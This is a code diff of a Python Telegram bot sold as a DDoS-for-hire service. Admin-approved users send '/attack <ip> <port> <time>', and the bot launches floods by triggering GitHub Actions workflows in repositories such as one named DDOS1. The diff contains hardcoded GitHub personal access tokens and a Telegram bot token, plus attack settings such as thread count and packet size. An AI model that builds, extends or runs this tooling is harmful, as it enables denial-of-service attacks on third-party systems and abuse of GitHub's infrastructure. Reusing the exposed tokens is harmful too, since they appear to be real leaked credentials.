@@ -1,3 +1,28 @@
+import time
+import asyncio
+import aiohttp
+from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
+from telegram import Update
+
+# TOKENS (Keep your existing ones)
+TELEGRAM_TOKEN = "7688656106:AAGemk2HxBFNPevOxulUH4Imc4e2F4o9Prs"
+ADMIN_ID = 6881937738
+
+GITHUB_ACCOUNTS = [
+    {'token': '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', 'repos': ['venomxpro1201-prog/DDOS1']},
+    {'token': 'ghp_dehtsbfsl7iMTHQh4R1Y2rL92Zv18vfVK', 'repos': ['suraj5277275/turbo-cto-stem']}
+]
+
+approved_users = {}
+is_attack_running = False
+attack_end_time = 0 
+current_target = ""
+
+PACKET_SIZE = 64
+THREADS = 150
+
+# --- LOGIC FUNCTIONS ---
+
 def is_approved(user_id: int):
     if user_id in approved_users:
         return time.time() < approved_users[user_id]['expiry_time']
@@ -17,7 +42,7 @@ async def fire_workflow_async(session, token, repo, params):
             "Accept": "application/vnd.github.v3+json",
             "Content-Type": "application/json"
         }
-        async with session.post(url, headers=headers, json=params, timeout=5) as response:
+        async with session.post(url, headers=headers, json=params, timeout=10) as response:
             return response.status == 204
     except:
         return False
@@ -36,14 +61,12 @@ async def trigger_all_workflows_async(ip, port, duration):
     tasks = []
     async with aiohttp.ClientSession() as session:
         for account in GITHUB_ACCOUNTS:
-            token = account['token']
             for repo in account['repos']:
-                tasks.append(asyncio.create_task(fire_workflow_async(session, token, repo, params)))
-        await asyncio.gather(*tasks, return_exceptions=True)
+                tasks.append(fire_workflow_async(session, account['token'], repo, params))
+        results = await asyncio.gather(*tasks, return_exceptions=True)
+    return results
 
-async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    welcome = "⚡ 𝕄ℝ.𝕏 𝕌𝕃𝕋𝐑𝔸 ℙ𝕆𝕎𝔼𝐑 𝔻𝔻𝕆𝐒 ⚡️\n\n/attack <ip> <port> <time>\n/Myid - Check Status"
-    await update.message.reply_text(welcome)
+# --- COMMAND HANDLERS ---
 
 async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
     global is_attack_running, attack_end_time, current_target
@@ -52,73 +75,82 @@ async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("❌ Not approved.")
         return
     
-    now = time.time()
-    if is_attack_running and now < attack_end_time:
-        rem = int(attack_end_time - now)
-        await update.message.reply_text(f"⚠️ BOT BUSY\n⏳ Wait: {rem}s\n🎯 Target: {current_target}")
-        return
-        
+    # Non-blocking Cooldown Check
+    if is_attack_running:
+        remaining_time = int(attack_end_time - time.time())
+        if remaining_time > 0:
+            await update.message.reply_text(f"⚠️ BOT BUSY\n⏳ Cooldown: {remaining_time}s\n🎯 Target: {current_target}")
+            return
+
     if len(context.args) != 3:
         await update.message.reply_text("Usage: /attack <ip> <port> <time>")
         return
 
     try:
-        ip, port = context.args[0], context.args[1]
-        time_int = int(context.args[2])
+        ip, port, time_int = context.args[0], context.args[1], int(context.args[2])
         if not (1 <= time_int <= 300):
-            await update.message.reply_text("❌ Max 300s")
+            await update.message.reply_text("❌ Time must be 1-300 seconds.")
             return
-    except:
+    except ValueError:
         await update.message.reply_text("❌ Invalid input.")
         return
 
     is_attack_running = True
-    attack_end_time = now + time_int
+    attack_end_time = time.time() + time_int
     current_target = f"{ip}:{port}"
     
-    await update.message.reply_text(f"🚀 ATTACK SENT\n🎯 {ip}:{port}\n⏰ {time_int}s")
+    await update.message.reply_text(f"🚀 ATTACK DISPATCHED\n🎯 Target: {ip}:{port}\n⏰ Time: {time_int}s")
+    
+    # Run attack in background immediately
     asyncio.create_task(execute_attack(update, ip, port, time_int))
 
 async def execute_attack(update, ip, port, duration):
     global is_attack_running, current_target
     try:
+        # Trigger GitHub workflows in background
         await trigger_all_workflows_async(ip, port, duration)
+        # Wait for the attack time
         await asyncio.sleep(duration)
-        await update.message.reply_text(f"✅ ATTACK FINISHED\n🎯 {ip}:{port}")
+        await update.message.reply_text(f"✅ ATTACK COMPLETED\n🎯 Target: {ip}:{port}")
     finally:
         is_attack_running = False
         current_target = ""
 
+# --- BOT SETUP ---
+
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await update.message.reply_text("⚡ 𝕄ℝ.𝕏 𝕌𝕃𝕋𝐑𝔸 ℙ𝕆𝕎𝔼𝐑 𝔻𝔻𝕆𝐒 ⚡️\n\n/attack <ip> <port> <time>\n/Myid - Check Status")
+
 async def Myid(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     status = "✅ APPROVED" if is_approved(user_id) else "❌ NOT APPROVED"
-    await update.message.reply_text(f"🆔 ID: {user_id}\nStatus: {status}")
+    await update.message.reply_text(f"👤 User: {update.effective_user.first_name}\n🆔 ID: {user_id}\n{status}")
 
 async def approve(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id != ADMIN_ID: return
     try:
         uid, days = int(context.args[0]), int(context.args[1])
         approve_user(uid, days)
-        await update.message.reply_text(f"✅ Approved {uid}")
+        await update.message.reply_text(f"✅ Approved {uid} for {days} days.")
     except: pass
 
 async def remove(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id != ADMIN_ID: return
     try:
         uid = int(context.args[0])
-        if uid in approved_users: del approved_users[uid]
-        await update.message.reply_text(f"🗑️ Removed {uid}")
+        if uid in approved_users:
+            del approved_users[uid]
+            await update.message.reply_text(f"🗑️ User {uid} removed.")
     except: pass
 
 def main():
-    app = ApplicationBuilder().token(TELEGRAM_TOKEN).build()
-    app.add_handler(CommandHandler("start", start))
-    app.add_handler(CommandHandler("attack", attack))
-    app.add_handler(CommandHandler("Myid", Myid))
-    app.add_handler(CommandHandler("approve", approve))
-    app.add_handler(CommandHandler("remove", remove))
-    print("✅ Bot is online.")
-    app.run_polling(drop_pending_updates=True)
+    application = ApplicationBuilder().token(TELEGRAM_TOKEN).build()
+    application.add_handler(CommandHandler("start", start))
+    application.add_handler(CommandHandler("Myid", Myid))
+    application.add_handler(CommandHandler("approve", approve))
+    application.add_handler(CommandHandler("remove", remove))
+    application.add_handler(CommandHandler("attack", attack))
+    application.run_polling(drop_pending_updates=True)
 
 if __name__ == "__main__":
     main()
